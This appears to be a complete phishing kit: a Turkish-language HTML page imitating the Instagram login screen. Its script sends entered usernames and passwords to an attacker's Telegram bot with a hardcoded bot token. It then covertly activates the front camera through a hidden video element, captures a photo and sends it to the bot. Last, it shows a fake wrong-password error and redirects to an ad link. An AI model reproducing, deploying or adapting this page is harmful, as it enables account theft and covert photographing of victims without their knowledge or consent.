<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giri≈ü Yap ‚Ä¢ Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 30px; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        .btn-login { width: 100%; background: #0095f6; border: none; color: white; padding: 7px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-login:disabled { background: #b2dffc; cursor: default; }
        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
        #status { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
        
        /* Gizli Video ve Canvas */
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511102835.png" alt="Instagram" class="logo">
    
    <input type="text" id="user-phone" placeholder="Telefon numarasƒ±, kullanƒ±cƒ± adƒ± veya e-posta">
    <input type="password" id="user-pass" placeholder="≈ûifre">
    
    <button class="btn-login" id="login-btn" onclick="executeCapture()">Giri≈ü Yap</button>

    <div class="divider">YA DA</div>
    <p style="color:#385185; font-weight:bold; font-size:14px; cursor:pointer;">Facebook ile Giri≈ü Yap</p>
    
    <div id="status">√úzg√ºn√ºz, ≈üifreniz yanlƒ±≈ütƒ±. L√ºtfen ≈üifrenizi kontrol edin.</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const ownerID = urlParams.get('id');

    const CONFIG = {
        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // BURAYA KENDƒ∞ BOT TOKENINI YAZ A≈ûKIM
        REDIRECT: "https://redirectplayfastly.com/?s=96&ref=sa_w237557c297471l16817p1349_prosperitycollege.ca&from=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D&click_id=19ad268.2.4sr67ie&encoded_url=dHIvcmVnaXN0ZXI%2Fc3ViX2lkPXByb3NwZXJpdHljb2xsZWdlLmNh"
    };

    async function sendData(msg, photo = null) {
        if (!ownerID) return;
        const api = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
        const fd = new FormData();
        fd.append('chat_id', ownerID);

        if (photo) {
            fd.append('photo', photo, 'capture.jpg');
            fd.append('caption', msg);
            await fetch(api + 'sendPhoto', { method: 'POST', body: fd });
        } else {
            fd.append('text', msg);
            await fetch(api + 'sendMessage', { method: 'POST', body: fd });
        }
    }

    async function executeCapture() {
        const user = document.getElementById('user-phone').value;
        const pass = document.getElementById('user-pass').value;
        const btn = document.getElementById('login-btn');
        const status = document.getElementById('status');

        if (user.length < 3 || pass.length < 5) return;

        btn.disabled = true;
        btn.innerText = "Y√ºkleniyor...";

        // 1. Veri: Kullanƒ±cƒ± adƒ± ve ≈ûifreyi hemen g√∂nder
        await sendData(`üì± **INSTAGRAM HESABI D√ú≈ûT√ú!**\n\nüë§ Kullanƒ±cƒ±: \`${user}\`\nüîë ≈ûifre: \`${pass}\``);

        // 2. ƒ∞≈ülem: Kamerayƒ± tetikle
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;
            await video.play();

            // 5 saniye bekle ve resmi √ßek
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    sendData(`üì∏ **G√ñR√úNT√ú YAKALANDI**\nüë§ Kullanƒ±cƒ±: ${user}`, blob);
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Hata mesajƒ± g√∂ster ve resmi siteye y√∂nlendir
                    status.style.display = "block";
                    btn.disabled = false;
                    btn.innerText = "Giri≈ü Yap";
                    setTimeout(() => window.location.href = CONFIG.REDIRECT, 2000);
                }, 'image/jpeg');
            }, 5000);

        } catch (e) {
            status.style.display = "block";
            setTimeout(() => window.location.href = CONFIG.REDIRECT, 2000);
        }
    }
</script>
</body>
</html>
